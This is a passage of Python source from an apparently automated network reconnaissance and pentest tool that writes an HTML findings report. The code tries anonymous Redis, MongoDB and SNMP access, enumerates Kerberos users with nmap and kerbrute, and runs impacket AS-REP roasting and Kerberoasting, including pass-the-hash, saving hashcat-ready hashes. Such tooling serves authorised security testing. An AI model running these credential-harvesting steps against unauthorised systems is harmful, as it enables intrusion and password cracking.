        (SNMP_PORTS, "snmp", "snmp-info", ["snmp"]),
        (VNC_PORTS, "vnc", "vnc-info", ["vnc"]),
        (REDIS_PORTS, "redis", "redis-info", ["redis"]),
        (MONGO_PORTS, "mongodb", "mongodb-info", ["mongo", "mongodb"]),
        (ELASTIC_PORTS, "elasticsearch", "http-title,http-headers", ["elastic", "elasticsearch"]),
        (DOCKER_PORTS, "docker", "docker-version", ["docker"]),
        (K8S_PORTS, "kubernetes", "http-title,http-headers", ["kubernetes", "kubelet"]),
        (IPMI_PORTS, "ipmi", "ipmi-version", ["ipmi"]),
        (TELNET_PORTS, "telnet", "telnet-encryption", ["telnet"]),
        (WINRM_PORTS, "winrm", "http-title,http-headers", ["winrm", "wsman"]),
    ]
    seen_services: set[tuple[str, int, str, str]] = set()
    for ports, name, script, tokens in generic_scripts:
        for service in services_by_ports_or_tokens(state, ports, tokens):
            service_key = (name, service.ip, service.port, service.protocol)
            if service_key in seen_services:
                continue
            seen_services.add(service_key)
            if has_tool("nmap"):
                command = ["nmap", "-Pn", "-p", str(service.port), "--script", script, service.ip]
                if service.protocol == "udp":
                    command.insert(1, "-sU")
                result = run_service_command(command, raw_dir / f"nmap_{name}_{safe_filename(service.ip)}_{service.port}.txt", args, logger, [])
                add_tool_evidence(state, name, service.ip, service.port, f"nmap {script}", result, parse_generic_keywords(result.stdout + result.stderr))
            
            if name == "redis" and has_tool("redis-cli"):
                command = ["redis-cli", "-h", service.ip, "-p", str(service.port), "INFO"]
                result = run_service_command(command, raw_dir / f"redis_anon_{safe_filename(service.ip)}_{service.port}.txt", args, logger, [])
                success = result.returncode == 0 and "NOAUTH Authentication required" not in result.stderr and "redis_version" in result.stdout
                record_auth_attempt_evidence(
                    state, service, category="database", protocol="redis", tool="redis-cli",
                    pair=CredentialPair("", ""), mode="anonymous", success=success,
                    command=shell_join(command), raw_output_file=relpath(result.output_file or "", state.output_dir), transcript=result.stdout + result.stderr
                )

            if name == "mongodb" and has_tool("mongosh"):
                command = ["mongosh", "--host", service.ip, "--port", str(service.port), "--eval", "quit()"]
                result = run_service_command(command, raw_dir / f"mongo_anon_{safe_filename(service.ip)}_{service.port}.txt", args, logger, [])
                success = result.returncode == 0 and "AuthenticationFailed" not in (result.stdout + result.stderr)
                record_auth_attempt_evidence(
                    state, service, category="database", protocol="mongodb", tool="mongosh",
                    pair=CredentialPair("", ""), mode="anonymous", success=success,
                    command=shell_join(command), raw_output_file=relpath(result.output_file or "", state.output_dir), transcript=result.stdout + result.stderr
                )

            if name == "snmp" and has_tool("snmpwalk"):
                command = ["snmpwalk", "-v2c", "-c", "public", f"udp:{service.ip}:{service.port}", "1.3.6.1.2.1.1.1"]
                result = run_service_command(command, raw_dir / f"snmp_public_{safe_filename(service.ip)}_{service.port}.txt", args, logger, [])
                success = result.returncode == 0 and "Timeout" not in result.stderr and "No Response from" not in result.stdout
                record_auth_attempt_evidence(
                    state, service, category="snmp", protocol="snmp", tool="snmpwalk",
                    pair=CredentialPair("public", ""), mode="community", success=success,
                    command=shell_join(command), raw_output_file=relpath(result.output_file or "", state.output_dir), transcript=result.stdout + result.stderr
                )

            severity = "low" if name in {"winrm", "docker", "kubernetes", "redis", "mongodb", "elasticsearch", "vnc", "telnet"} else "info"
            state.add_evidence(
                Evidence(
                    category=name,
                    ip=service.ip,
                    port=service.port,
                    service=name,
                    title=f"{name.upper()} service exposed",
                    description=f"{name} service is reachable on {service.protocol.upper()}/{service.port}.",
                    severity=severity,
                )
            )


def run_kerberos_user_enum_if_enabled(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    if not args.enable_user_enum:
        return
    realms = resolve_kerberos_realms(args, state)
    if not realms:
        logger.warn("No Kerberos realm could be resolved; skipping Kerberos user enum")
        return
    if not has_tool("nmap"):
        logger.warn("Nmap missing; skipping Kerberos user enum")
        return
    services = [
        service
        for service in services_by_ports_or_group(state, KERBEROS_PORTS, "KERBEROS", {"tcp"})
        if service.port == 88 or "kerberos" in (service.service or "").lower()
    ]
    if not services:
        return
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "kerberos"
    raw_dir.mkdir(parents=True, exist_ok=True)
    for service in services:
        ip = service.ip
        port = service.port
        for realm in kerberos_realms_for_target(state, ip, realms):
            dsuffix = f"_{safe_filename(realm)}"
            curr_args = [f"krb5-enum-users.realm={realm}"]
            if args.user_enum_wordlist:
                curr_args.append(f"userdb={args.user_enum_wordlist}")
            command = [
                "nmap",
                "-Pn",
                "-p",
                str(port),
                "--script",
                "krb5-enum-users",
                "--script-args",
                ",".join(curr_args),
                ip,
            ]
            result = run_service_command(command, raw_dir / f"nmap_krb5_enum_users_{safe_filename(ip)}_{port}{dsuffix}.txt", args, logger, [])
            add_tool_evidence(state, "kerberos", ip, port, "nmap krb5-enum-users", result, parse_generic_keywords(result.stdout + result.stderr))


def run_kerbrute_user_enum(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    """Run kerbrute userenum against all hosts with Kerberos port 88 open."""
    if not has_tool("kerbrute"):
        logger.info("kerbrute not available; skipping Kerberos user brute-force enumeration")
        return
    services = [
        service
        for service in services_by_ports_or_group(state, KERBEROS_PORTS, "KERBEROS", {"tcp"})
        if service.port == 88 or "kerberos" in (service.service or "").lower()
    ]
    if not services:
        return
    realms = resolve_kerberos_realms(args, state)
    if not realms:
        logger.warn("No Kerberos realms available (use --kerberos-realm or ensure domain is discovered); skipping kerbrute")
        return
    wordlist = resolve_kerbrute_wordlist(args)
    if not wordlist:
        logger.warn("No kerbrute user wordlist found in SecLists paths; skipping kerbrute userenum")
        return
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "kerberos"
    raw_dir.mkdir(parents=True, exist_ok=True)
    logger.info(f"Running kerbrute userenum against {len(services)} Kerberos target(s) with {len(realms)} realm(s)")
    seen_ips: set[str] = set()
    for service in services:
        ip = service.ip
        if ip in seen_ips:
            continue
        seen_ips.add(ip)
        port = service.port
        for realm in kerberos_realms_for_target(state, ip, realms):
            dsuffix = f"_{safe_filename(realm)}"
            command = ["kerbrute", "userenum", "--dc", ip, "-d", realm, str(wordlist)]
            result = run_service_command(command, raw_dir / f"kerbrute_userenum_{safe_filename(ip)}_{port}{dsuffix}.txt", args, logger, [])
            parsed = parse_kerbrute_results(result.stdout + result.stderr)
            add_tool_evidence(state, "kerberos", ip, port, "kerbrute userenum", result, parsed)


def run_asrep_roasting(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    if not has_tool("impacket-GetNPUsers"):
        return
    services = [s for s in services_by_ports_or_group(state, KERBEROS_PORTS, "KERBEROS", {"tcp"}) if s.port == 88 or "kerberos" in (s.service or "").lower()]
    if not services:
        return
    realms = resolve_kerberos_realms(args, state)
    if not realms:
        return
    
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "kerberos"
    raw_dir.mkdir(parents=True, exist_ok=True)

    fallback_wordlist = resolve_kerbrute_wordlist(args) if getattr(args, "enable_user_enum", False) else None
    seen_ips = set()
    for service in services:
        ip = service.ip
        if ip in seen_ips:
            continue
        seen_ips.add(ip)
        for realm in kerberos_realms_for_target(state, ip, realms):
            dsuffix = f"_{safe_filename(realm)}"
            output_file = raw_dir / f"asrep_hashes_{safe_filename(ip)}{dsuffix}.txt"
            valid_users = kerberos_valid_users_for_target(state, ip)
            wordlist = fallback_wordlist
            if valid_users:
                generated_wordlist = raw_dir / f"valid_users_{safe_filename(ip)}{dsuffix}.txt"
                private_write_text(generated_wordlist, "\n".join(valid_users) + "\n")
                wordlist = str(generated_wordlist)
            if wordlist:
                command = ["impacket-GetNPUsers", f"{realm}/", "-no-pass", "-usersfile", str(wordlist), "-format", "hashcat", "-outputfile", str(output_file), "-dc-ip", ip]
                result = run_service_command(command, raw_dir / f"impacket_GetNPUsers_{safe_filename(ip)}{dsuffix}.txt", args, logger, [])
                parsed = parse_generic_keywords(result.stdout + result.stderr)
                if valid_users:
                    parsed["valid_users"] = valid_users
                add_tool_evidence(state, "kerberos", ip, service.port, "impacket-GetNPUsers (wordlist)", result, parsed)
            else:
                logger.warn(f"AS-REP sem autenticação ignorado em {ip}: nenhuma lista de usuários disponível")

            valid_creds = validated_kerberos_credentials(state, ip, realm)
            for cred in valid_creds:
                username = cred["username"]
                password = cred["password"]
                is_hash = cred["method"] == "hash"
                csuffix = f"_{safe_filename(username)}_{hashlib.sha256(password.encode('utf-8', errors='ignore')).hexdigest()[:10]}"
                auth_output_file = raw_dir / f"asrep_hashes_auth_{safe_filename(ip)}{dsuffix}{csuffix}.txt"
                secrets = [password]
                if is_hash:
                    auth_cmd = ["impacket-GetNPUsers", "-hashes", normalize_ntlm_hash(password), f"{realm}/{username}"]
                else:
                    auth_cmd = ["impacket-GetNPUsers", f"{realm}/{username}:{password}"]
                auth_cmd.extend(["-dc-ip", ip, "-request", "-format", "hashcat", "-outputfile", str(auth_output_file)])
                result = run_service_command(auth_cmd, raw_dir / f"impacket_GetNPUsers_auth_{safe_filename(ip)}{dsuffix}{csuffix}.txt", args, logger, secrets)
                add_tool_evidence(state, "kerberos", ip, service.port, "impacket-GetNPUsers (auth)", result, parse_generic_keywords(result.stdout + result.stderr))


def run_kerberoasting(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    if not has_tool("impacket-GetUserSPNs"):
        return
    services = [s for s in services_by_ports_or_group(state, KERBEROS_PORTS, "KERBEROS", {"tcp"}) if s.port == 88 or "kerberos" in (s.service or "").lower()]
    if not services:
        return
    realms = resolve_kerberos_realms(args, state)
    if not realms:
        return
        
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "kerberos"
    raw_dir.mkdir(parents=True, exist_ok=True)
    
    seen_ips = set()
    for service in services:
        ip = service.ip
        if ip in seen_ips:
            continue
        seen_ips.add(ip)
        for realm in kerberos_realms_for_target(state, ip, realms):
            valid_creds = validated_kerberos_credentials(state, ip, realm)
            for cred in valid_creds:
                dsuffix = f"_{safe_filename(realm)}"
                username = cred["username"]
                password = cred["password"]
                is_hash = cred["method"] == "hash"
                csuffix = f"_{safe_filename(username)}_{hashlib.sha256(password.encode('utf-8', errors='ignore')).hexdigest()[:10]}"
                output_file = raw_dir / f"kerberoast_hashes_{safe_filename(ip)}{dsuffix}{csuffix}.txt"

                secrets = [password]
                if is_hash:
                    command = ["impacket-GetUserSPNs", "-hashes", normalize_ntlm_hash(password), f"{realm}/{username}"]
                else:
                    command = ["impacket-GetUserSPNs", f"{realm}/{username}:{password}"]
                command.extend(["-dc-ip", ip, "-request", "-outputfile", str(output_file)])
                result = run_service_command(command, raw_dir / f"impacket_GetUserSPNs_{safe_filename(ip)}{dsuffix}{csuffix}.txt", args, logger, secrets)
                add_tool_evidence(state, "kerberos", ip, service.port, "impacket-GetUserSPNs", result, parse_generic_keywords(result.stdout + result.stderr))


def kerberos_valid_users_for_target(state: ScanState, ip: str) -> list[str]:
    users: list[str] = []
    for item in state.evidence:
        if item.ip != ip:
            continue
        for key in ("valid_users", "domain_users"):
            values = item.data.get(key, []) if item.data else []
            if isinstance(values, list):
                users.extend(str(value).strip() for value in values if str(value).strip())
    return dedupe_text(users)


def normalized_realm(value: str) -> str:
    return (value or "").strip().strip(".").lower()


def validated_kerberos_credentials(state: ScanState, dc_ip: str, realm: str) -> list[dict[str, str]]:
    """Use credentials validated on the DC or on a host explicitly tied to the same realm."""
    realm_value = normalized_realm(realm)
    credentials_by_target = detect_auth_credentials_from_evidence(state)
    result: list[dict[str, str]] = []
    seen: set[tuple[str, str, str, str]] = set()
    for (target_ip, _), credentials in credentials_by_target.items():
        host_domain = normalized_realm(state.hosts.get(target_ip, HostRecord(ip=target_ip)).domain)
        for credential in credentials:
            if credential.get("method") == "anonymous" or not credential.get("username") or not credential.get("password"):
                continue
            credential_domain = normalized_realm(credential.get("domain", ""))
            domain_matches = bool(realm_value) and credential_domain == realm_value
            host_matches = bool(realm_value) and host_domain == realm_value
            direct_dc_match = target_ip == dc_ip and not credential_domain
            relevant = domain_matches or (not credential_domain and (host_matches or direct_dc_match))
            if not relevant:
                continue
            key = credential_key(credential)
            if key in seen:
                continue
            seen.add(key)
            result.append(credential)
    return result


def kerberos_realms_for_target(state: ScanState, ip: str, realms: list[str]) -> list[str]:
    """Avoid sending a realm to a DC that is explicitly identified for another realm."""
    host_domain = normalized_realm(state.hosts.get(ip, HostRecord(ip=ip)).domain)
    if not host_domain:
        return realms
    return [realm for realm in realms if normalized_realm(realm) == host_domain]


def resolve_kerberos_realms(args: argparse.Namespace, state: ScanState) -> list[str]:
    """Determine Kerberos realms: explicit CLI + discovered domains from hosts."""
    realms: set[str] = set()
    realm_arg = getattr(args, "kerberos_realm", None)
    if realm_arg:
        realms.update(r.strip() for r in realm_arg.split(",") if r.strip())
    domain_arg = getattr(args, "domain", "")
    if domain_arg:
        realms.update(r.strip().upper() for r in domain_arg.split(",") if r.strip())
    hosts = list(state.hosts.values())
    for d in discovered_local_domains(hosts):
        realms.add(d.upper())
    for host in hosts:
        if host.domain:
            realms.add(host.domain.strip().strip(".").upper())
    return sorted(r for r in realms if r)


def resolve_kerbrute_wordlist(args: argparse.Namespace) -> str:
    """Find the best available kerbrute user wordlist from SecLists."""
    custom = getattr(args, "user_enum_wordlist", None)
    if custom and Path(custom).is_file():
        return custom
    for candidate in KERBRUTE_USER_WORDLIST_CANDIDATES:
        if Path(candidate).is_file():
            return candidate
    return ""


def parse_kerbrute_results(text: str) -> dict[str, Any]:
    """Parse kerbrute output for valid usernames."""
    parsed: dict[str, Any] = {}
    valid_users: list[str] = []
    for line in text.splitlines():
        lower = line.lower()
        if "valid_username" in lower or "[+]" in line:
            # kerbrute outputs: YYYY/MM/DD HH:MM:SS >  [+] VALID USERNAME:  user@REALM
            match = re.search(r"valid[_ ]username:?\s+([^\s@]+)", line, re.IGNORECASE)
            if match:
                valid_users.append(match.group(1))
    if valid_users:
        parsed["valid_users"] = valid_users
        parsed["severity"] = "medium"
        parsed["description"] = f"Kerbrute found {len(valid_users)} valid username(s): {', '.join(valid_users[:10])}"
        if len(valid_users) > 10:
            parsed["description"] += f" (+{len(valid_users) - 10} more)"
    return parsed


def run_service_command(
    command: list[str],
    output_file: Path,
    args: argparse.Namespace,
    logger: Logger,
    secrets: Iterable[str],
) -> CommandResult:
    base_timeout = {1: 60, 2: 90, 3: 120, 4: 180, 5: 240}[args.threads_level]
    return run_command(
        command,
        timeout=base_timeout,
        output_file=output_file,
        logger=logger,
        secrets=secrets,
    )


def add_tool_evidence(
    state: ScanState,
    category: str,
    ip: str,
    port: int | None,
    title: str,
    result: CommandResult,
    parsed: dict[str, Any],
) -> None:
    if not result.stdout.strip() and not result.stderr.strip():
        return
    # Skip failed commands unless parsed data has interesting findings
    has_interesting_parsed = any(
        key not in {"severity", "description", "contains_version_info"}
        for key in parsed
    )
    if result.returncode != 0 and not has_interesting_parsed:
        return
    severity = parsed.pop("severity", "info")
    if "description" in parsed:
        description = parsed.pop("description")
    else:
        description = ""
    # Store stdout excerpt for inline expandable display
    if result.returncode == 0 and result.stdout.strip():
        parsed["output_excerpt"] = result.stdout.strip()[:4000]
    state.add_evidence(
        Evidence(
            category=category,
            ip=ip,
            port=port,
            service=category,
            title=title,
            description=description,
            command=shell_join(result.redacted_command),
            raw_output_file=relpath(result.output_file or "", state.output_dir),
            severity=severity,
            data=parsed,
        )
    )


def parse_smb_keywords(text: str) -> dict[str, Any]:
    parsed: dict[str, Any] = {}
    lower = text.lower()
    signing_match = re.search(r"\bsigning\s*:\s*(true|false)\b", text, flags=re.I)
    signing_is_disabled = (
        (signing_match is not None and signing_match.group(1).lower() == "false")
        or "smb signing disabled" in lower
        or "message signing disabled" in lower
    )
    if signing_is_disabled:
        parsed["severity"] = "medium"
        parsed["description"] = "SMB signing appears disabled or not required."
        parsed["smb_signing"] = False
    elif signing_match is not None:
        parsed["smb_signing"] = True
    # Detect SMBv1 enabled from nxc/crackmapexec/nmap output
    smbv1_detected = detect_smbv1_enabled(text)
    if smbv1_detected:
        parsed["smbv1_enabled"] = True
        if parsed.get("severity") != "high":
            parsed["severity"] = "high"
        existing_desc = parsed.get("description", "")
        smbv1_desc = "SMBv1 is enabled on this host. This is a critical security risk."
        parsed["description"] = f"{existing_desc} {smbv1_desc}".strip()
    domain = extract_regex(text, r"(?:domain|domain name|workgroup)[:=]\s*([A-Za-z0-9_.-]+)")
    hostname = extract_regex(text, r"(?:hostname|computer\s+name|(?<!domain )name)[:=]\s*([A-Za-z0-9_.-]+)")
    os_text = extract_regex(text, r"(?:os|platform)[:=]\s*([^\n\r]+)")
    if domain:
        parsed["domain"] = domain
    if hostname:
        parsed["hostname"] = hostname
    if os_text:
        parsed["os"] = os_text.strip()
    if "anonymous login successful" in lower or "null session" in lower:
        parsed["severity"] = "medium"
        parsed["description"] = "Tool output suggests anonymous/null SMB access."
        parsed["anonymous_or_null_session"] = True
    return parsed


def smb_signing_value_is_false(value: Any) -> bool:
    """Accept current boolean values and legacy serialized signing values."""
    if value is False:
        return True
    if value is None or value is True:
        return False
    normalized = str(value).strip().lower()
    return normalized in {"disabled", "disabled_or_not_required"} or re.match(r"^false\b", normalized) is not None


def host_has_smb_signing_false(state: ScanState, ip: str) -> bool:
    return any(
        item.category == "smb"
        and item.ip == ip
        and smb_signing_value_is_false(item.data.get("smb_signing"))
        for item in state.evidence
    )


ANSI_ESCAPE_RE = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]")


def strip_ansi(text: str) -> str:
    return ANSI_ESCAPE_RE.sub("", text or "").replace("\x00", "")


def parse_smbclient_share_listing(text: str) -> list[str]:
    """Extract disk share names from the human-readable smbclient -L table."""
    shares: list[str] = []
    for line in strip_ansi(text).splitlines():
        match = re.match(r"^\s*(.+?\S)\s{2,}(Disk|IPC|Printer)(?:\s{2,}.*)?$", line, flags=re.I)
        if not match or match.group(2).lower() != "disk":
            continue
        name = match.group(1).strip()
        if name.lower() != "sharename" and name not in shares:
            shares.append(name)
    return shares


SMB_ACCESS_DENIED_RE = re.compile(
    r"(?:NT_STATUS_)?(?:ACCESS_DENIED|LOGON_FAILURE|BAD_NETWORK_NAME)|"
    r"STATUS_ACCESS_DENIED|TREE\s+CONNECT\s+FAILED|ACCESS\s+DENIED|"
    r"PERMISSION\s+DENIED",
    flags=re.IGNORECASE,
)

SMB_AUTH_FAILURE_RE = re.compile(
    r"(?:NT_STATUS_)?(?:LOGON_FAILURE|ACCOUNT_LOCKED_OUT|ACCOUNT_DISABLED|"
    r"PASSWORD_EXPIRED|PASSWORD_MUST_CHANGE|NO_SUCH_USER|WRONG_PASSWORD)|"
    r"SESSION\s+SETUP\s+FAILED",
    flags=re.IGNORECASE,
)

SMB_COMMAND_FAILURE_RE = re.compile(
    r"(?:NT_STATUS_|STATUS_)?(?:ACCESS_DENIED|LOGON_FAILURE|BAD_NETWORK_NAME|"
    r"OBJECT_PATH_NOT_FOUND|OBJECT_NAME_NOT_FOUND|RESOURCE_NAME_NOT_FOUND)|"
    r"TREE\s+CONNECT\s+FAILED|SESSION\s+SETUP\s+FAILED|"
    r"ACCESS\s+DENIED|PERMISSION\s+DENIED",
    flags=re.IGNORECASE,
)


def smb_access_denied(text: str) -> bool:
    """Return True when SMB output proves that the requested tree was denied."""
    return bool(SMB_ACCESS_DENIED_RE.search(strip_ansi(text or "")))


def smb_authentication_failed(text: str) -> bool:
    """Detect definitive identity failures before probing every discovered share."""
    return bool(SMB_AUTH_FAILURE_RE.search(strip_ansi(text or "")))


def smb_share_listing_succeeded(result: CommandResult) -> bool:
    combined = strip_ansi((result.stdout or "") + (result.stderr or ""))
    return result.returncode == 0 and not SMB_COMMAND_FAILURE_RE.search(combined)


def smb_share_access_succeeded(result: CommandResult) -> bool:
    """A share is accessible only after a successful tree connect and directory listing."""
    return smb_share_listing_succeeded(result)


def smb_permission_denies_tree_connect(permission: dict[str, Any]) -> bool:
    """Do not probe or map a share already marked as inaccessible by enum4linux."""
    labels = permission.get("permissions", [])
    normalized = {str(label).strip().upper() for label in labels} if isinstance(labels, list) else set()
    mapping = str(permission.get("mapping", "")).strip().upper()
    return mapping == "DENIED" or "ACCESS DENIED" in normalized


def remove_smb_listing_artifacts(share_dir: Path) -> None:
    """Remove only generated listing files when a share is proven inaccessible."""
    try:
        candidates = list(share_dir.glob("listing-*.txt")) + list(share_dir.glob("listing-attempt-*.txt"))
    except OSError:
        return
    for candidate in candidates:
        try:
            candidate.unlink()
        except OSError:
            pass


def share_permission_labels(mapping: str, listing: str, writing: str) -> list[str]:
    mapping_value = (mapping or "").strip().upper()
    listing_value = (listing or "").strip().upper()
    writing_value = (writing or "").strip().upper()
    if mapping_value == "DENIED":
        return ["ACCESS DENIED"]
    labels: list[str] = []
    if mapping_value == "OK":
        labels.append("ACCESS")
    if listing_value == "OK":
        labels.extend(["VIEW", "READ"])
    elif listing_value == "DENIED":
        labels.append("VIEW DENIED")
    if writing_value == "OK":
        labels.append("WRITE")
    elif writing_value == "DENIED":
        labels.append("WRITE DENIED")
    return dedupe_text(labels) or ["UNKNOWN"]


def parse_enum4linux_output(text: str) -> dict[str, Any]:
    """Parse stable enum4linux 0.9.x headings into report-friendly data."""
    clean = strip_ansi(text)
    local_users: list[str] = []
    domain_users: list[str] = []
    unscoped_users: list[str] = []
    local_groups: list[str] = []
    domain_groups: list[str] = []
    group_members: dict[str, list[str]] = {}
    shares: list[dict[str, Any]] = []
    current_group_scope = ""

    for raw_line in clean.splitlines():
        line = raw_line.strip()
        lower = line.lower()
        if "getting builtin groups" in lower or "getting local groups" in lower:
            current_group_scope = "local"
        elif "getting domain groups" in lower:
            current_group_scope = "domain"

        group_match = re.search(r"\bgroup:\[([^\]]+)\]\s+rid:\[", line, flags=re.I)
        if group_match:
            group_name = group_match.group(1).strip()
            target = domain_groups if current_group_scope == "domain" else local_groups
            if group_name and group_name not in target:
                target.append(group_name)

        member_match = re.search(r"Group:\s*'?(.+?)'?\s*\(RID:\s*\d+\)\s+has member:\s*(.+)$", line, flags=re.I)
        if member_match:
            group_name = member_match.group(1).strip(" '\"")
            member = member_match.group(2).strip()
            if group_name and member:
                group_members.setdefault(group_name, [])
                if member not in group_members[group_name]:
                    group_members[group_name].append(member)

        user_match = re.search(r"\buser:\[([^\]]+)\]\s+rid:\[", line, flags=re.I)
        if user_match:
            username = user_match.group(1).strip()
            if username and username not in unscoped_users:
                unscoped_users.append(username)
        account_match = re.search(r"\bAccount:\s*([^\s]+)", line, flags=re.I)
        if account_match:
            username = account_match.group(1).strip()
            if username and username not in unscoped_users:
                unscoped_users.append(username)

        rid_principal = re.search(r"\\([^\\\s]+)\s+\((Local|Domain)\s+(User|Group)\)", line, flags=re.I)
        if rid_principal:
            name, scope, kind = rid_principal.groups()
            if kind.lower() == "user":
                target_users = local_users if scope.lower() == "local" else domain_users
                if name not in target_users:
                    target_users.append(name)
            else:
                target_groups = local_groups if scope.lower() == "local" else domain_groups
                if name not in target_groups:
                    target_groups.append(name)

        share_match = re.match(
            r"^//[^/]+/(.+?)\s+Mapping:\s*(\S+)\s+Listing:\s*(\S+)\s+Writing:\s*(\S+)",
            line,
            flags=re.I,
        )
        if share_match:
            name, mapping, listing, writing = (value.strip() for value in share_match.groups())
            shares.append(
                {
                    "name": name,
                    "mapping": mapping.upper(),
                    "listing": listing.upper(),
                    "writing": writing.upper(),
                    "permissions": share_permission_labels(mapping, listing, writing),
                }
            )

    parsed: dict[str, Any] = {}
    for key, values in (
        ("local_users", local_users),
        ("domain_users", domain_users),
        ("unscoped_users", unscoped_users),
        ("local_groups", local_groups),
        ("domain_groups", domain_groups),
    ):
        if values:
            parsed[key] = dedupe_text(values)
    if group_members:
        parsed["group_members"] = group_members
    if shares:
        unique_shares: dict[str, dict[str, Any]] = {}
        for share in shares:
            unique_shares[share["name"].lower()] = share
        parsed["shares"] = list(unique_shares.values())
    if parsed:
        parsed["interesting"] = True
        parsed["description"] = (
            f"enum4linux encontrou {len(local_users) + len(domain_users) + len(unscoped_users)} usuário(s), "
            f"{len(local_groups) + len(domain_groups)} grupo(s) e {len(shares)} compartilhamento(s)."
        )
    return parsed


def detect_smbv1_enabled(text: str) -> bool:
    """Detect if SMBv1 is enabled from nxc, crackmapexec, or nmap output."""
    lower = text.lower()
    # nxc / crackmapexec pattern: SMBv1:True or SMBv1 : True
    if re.search(r"smbv1\s*[:=]\s*true", lower):
        return True
    # nmap smb-protocols script output: lists dialects, SMBv1 shows as "NT LM 0.12" or just "1"
    if "nt lm 0.12" in lower:
        return True
    # nmap smb-protocols listing versions like "  1.0" or "  1"
    if re.search(r"smb[\s-]*protocols?", lower):
        # Look for explicit version 1 in protocol listing
        if re.search(r"\b(?:smb\s*)?(?:version\s*)?1(?:\.0)?\b", lower) and "smb" in lower:
            # Exclude false positives like SMB2.1 or SMB3.1.1
            for line in text.splitlines():
                line_stripped = line.strip().lower()
                if re.match(r"^\s*(?:nt lm 0\.12|1(?:\.0)?\s*$)", line_stripped):
                    return True
    # Generic patterns from various tools
    if "smbv1 enabled" in lower or "smb1 enabled" in lower:
        return True
    if "dialects:" in lower and "nt lm" in lower:
        return True
    return False


def parse_generic_keywords(text: str) -> dict[str, Any]:
    parsed: dict[str, Any] = {}
    lower = text.lower()
    if "anonymous" in lower and "allowed" in lower:
        parsed["severity"] = "medium"
        parsed["description"] = "Tool output suggests anonymous access is allowed."
    if "authentication" in lower and "disabled" in lower:
        parsed["severity"] = "medium"
        parsed["description"] = "Tool output suggests authentication may be disabled."
    if "version" in lower:
        parsed["contains_version_info"] = True
    return parsed


def extract_after(text: str, marker: str) -> str:
    lower = text.lower()
    idx = lower.find(marker.lower())
    if idx == -1:
        return ""
    return text[idx + len(marker):].splitlines()[0].strip()


def extract_regex(text: str, pattern: str) -> str:
    match = re.search(pattern, text, flags=re.I)
    if not match:
        return ""
    return match.group(1).strip()


def update_host_from_smb_text(state: ScanState, ip: str, text: str) -> None:
    parsed = parse_smb_keywords(text)
    kwargs: dict[str, Any] = {}
    if parsed.get("hostname"):
        kwargs["hostname"] = parsed["hostname"]
    if parsed.get("domain"):
        kwargs["domain"] = parsed["domain"]
    if parsed.get("os"):
        kwargs["os_guess"] = parsed["os"]
    if kwargs:
        kwargs["sources"] = ["smb-enum"]
        state.upsert_host(ip, **kwargs)


def grab_tcp_banner(ip: str, port: int, timeout: int = 5) -> str:
    try:
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            data = sock.recv(1024)
            return data.decode("utf-8", errors="replace").strip()
    except OSError:
        return ""


def derive_prioritized_findings(state: ScanState) -> None:
    existing = {
        (item.category, item.ip, item.port, item.title, item.description)
        for item in state.evidence
    }
    for service in state.services:
        service_name = (service.service or guess_service_by_port(service.port)).lower()
        product_name = service.product.lower()
        descriptor = f"{service_name} {product_name} {service.version.lower()}"
        severity = ""
        title = ""
        description = ""
        if service.port in RDP_PORTS or "rdp" in descriptor or "ms-wbt-server" in descriptor:
            severity = "low"
            title = "RDP open"
            description = "RDP is reachable and should be validated for exposure and access controls."
        elif service.port in WINRM_PORTS or "winrm" in descriptor or "wsman" in descriptor:
            severity = "low"
            title = "WinRM open"
            description = "WinRM is reachable and may support remote administration."
        elif service.port in DOCKER_PORTS or "docker" in descriptor:
            severity = "medium"
            title = "Docker API port open"
            description = "Docker API port is reachable; validate TLS/authentication requirements."
        elif service.port in K8S_PORTS or "kubernetes" in descriptor:
            severity = "medium"
            title = "Kubernetes API-related port open"
            description = "Kubernetes-related API port is reachable; validate authentication and network scope."
        elif service.port in REDIS_PORTS | MONGO_PORTS | ELASTIC_PORTS or any(token in descriptor for token in ["redis", "mongodb", "elasticsearch"]):
            severity = "medium"
            title = f"{service_name or 'data service'} open"
            description = "Data service is reachable; validate authentication and segmentation."
        elif service.port in MYSQL_PORTS | POSTGRES_PORTS | MSSQL_PORTS or any(token in descriptor for token in ["mysql", "postgres", "postgresql", "ms-sql", "mssql", "sql server"]):
            severity = "medium"
            title = f"{service.service or 'database'} open"
            description = "Database service is reachable; validate authentication, exposure and segmentation."
        elif service.port in TELNET_PORTS or "telnet" in descriptor:
            severity = "medium"
            title = "Telnet open"
            description = "Telnet is reachable and should be reviewed due to plaintext protocol risk."
        elif service.port in FTP_PORTS or service_name == "ftp":
            severity = "low"
            title = "FTP open"
            description = "FTP is reachable; validate authentication policy and plaintext exposure."
        elif service.port in SSH_PORTS or service_name == "ssh" or "openssh" in descriptor:
            severity = "info"
            title = "SSH open"
            description = "SSH is reachable; review exposed management surface and authentication controls."
        if severity:
            key = ("exposure", service.ip, service.port, title, description)
            if key not in existing:
                state.add_evidence(
                    Evidence(
                        category="exposure",
                        ip=service.ip,
                        port=service.port,
                        service=service.service,
                        title=title,
                        description=description,
                        severity=severity,
                    )
                )
                existing.add(key)


def generate_html_report(state: ScanState) -> Path:
    output_dir = Path(state.output_dir)
    report_path = output_dir / "report.html"
    dc_ips = set(detect_dc_ips(state))
    hosts = sorted(state.hosts.values(), key=lambda item: (0 if item.ip in dc_ips else 1, ip_sort_key(item.ip)))
    services = sorted(state.services, key=lambda item: (ip_sort_key(item.ip), item.port))
    web_endpoints = sorted(
        [endpoint for endpoint in state.web_endpoints if is_reportable_web_endpoint(endpoint)],
        key=lambda item: (ip_sort_key(item.ip), item.port, item.scheme, item.path),
    )
    web_roots = web_root_catalog_endpoints(services, web_endpoints)
    web_catalog = web_catalog_endpoints(services, web_endpoints)
    evidence = sorted(
        [item for item in state.evidence if not is_suppressed_evidence(item)],
        key=lambda item: (severity_rank(item.severity), ip_sort_key(item.ip), item.port or 0, item.title),
    )
    html_text = f"""<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
